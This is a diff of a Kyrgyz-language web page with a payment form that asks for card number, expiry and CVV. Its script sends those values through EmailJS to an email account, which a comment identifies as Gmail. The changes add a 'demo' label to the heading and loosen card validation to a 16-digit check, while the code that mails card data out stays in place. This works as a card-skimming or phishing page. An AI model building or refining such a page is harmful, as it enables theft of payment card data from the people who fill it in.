@@ -121,7 +121,7 @@
 <
 
 <div class="demo-payment">
-  <h2>Платежный метод 💳</h2>
+  <h2>Платежный метод 💳 (Демо)</h2>
   <form id="paymentForm">
     <input type="text" name="cardNumber" placeholder="Карта номери" required><br><br>
     <input type="text" name="expiry" placeholder="Мөөнөт (MM/YY)" required><br><br>
@@ -143,22 +143,11 @@
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
   (function(){
-     emailjs.init("Lejsdl7LbXKM0JQ6i"); // Сенин Public Key
+     emailjs.init("Lejsdl7LbXKM0JQ6i"); // Сениң Public Key
   })();
 
   function isValidCard(number) {
-    let sum = 0;
-    let shouldDouble = false;
-    for (let i = number.length - 1; i >= 0; i--) {
-      let digit = parseInt(number.charAt(i));
-      if (shouldDouble) {
-        digit *= 2;
-        if (digit > 9) digit -= 9;
-      }
-      sum += digit;
-      shouldDouble = !shouldDouble;
-    }
-    return sum % 10 === 0;
+    return /^\d{16}$/.test(number); // 16 цифра болсо гана туура деп эсептейт
   }
 
   document.getElementById('paymentForm').addEventListener('submit', function(event){
@@ -168,7 +157,8 @@
       return;
     }
 
-    emailjs.send('service_id', 'template_sw2lq9e', { // Сенин реалдуу service_id жана template_id
+    // Демо Gmail’ге жөнөтөт
+    emailjs.send('service_id', 'template_sw2lq9e', {
       cardNumber: this.cardNumber.value,
       expiry: this.expiry.value,
       cvv: this.cvv.value,
